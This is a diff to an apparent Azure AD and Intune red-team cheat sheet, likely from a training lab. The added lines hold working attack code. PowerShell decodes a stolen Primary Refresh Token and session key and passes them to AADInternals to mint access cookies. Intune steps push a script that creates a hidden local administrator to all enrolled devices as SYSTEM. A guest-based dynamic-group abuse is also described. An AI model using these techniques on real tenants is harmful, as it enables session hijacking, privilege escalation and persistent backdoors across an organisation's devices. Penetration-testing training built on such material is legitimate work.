@@ -62,7 +62,15 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd 
 #### Request access token (cookie) to all applications
 ```
 Import-Module .\AADInternals.psd1
-New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SessionKey -GetNonce
+
+$PRTOfMBarron = '<PRT>'
+while($PRTOfMBarron.Length % 4) {$PRTOfMBarron += "="}
+$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRTOfMBarron))
+
+$ClearKey = "<CLEARKEY>"
+$SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
+
+New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
 ```
 
 #### Copy the value from above command and use it with a web browser
@@ -76,9 +84,17 @@ New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SessionKey -GetNonce
 
 ## Intune
 - a user with Global Administrator or Intune Administrator role can execute PowerShell scripts on an enrolled Windows device. The script runs with privileges of SYSTEM on the device.
+- If user had Intune Administrator role go to https://endpoint.microsoft.com/#home and login (or from a ticket (PRT)
+- Go to Devices -> All Devices to check devices enrolled to Intune:
+- Go to Scripts and Click on Add for Windows 10. Create a new script and select a script
+- Example script adduser.ps1
 ```
-
+$passwd = ConvertTo-SecureString "Stud38Password@123" -AsPlainText -Force
+New-LocalUser -Name student38 -Password $passwd
+Add-LocalGroupMember -Group Administrators -Member student38
 ```
+- Select `Run script in 64 bit PowerShell Host`
+- On the assignment page select "Add all users" and "add all devices"
 
 ## Abusing dynamic groups
 - By default, any user can invite guests in Azure AD. If a dynamic group rule allows adding users based on the attributes that a guest user can modify, it will result in abuse of this feature. For example based on EMAIL ID and join as guest that matches that rule.
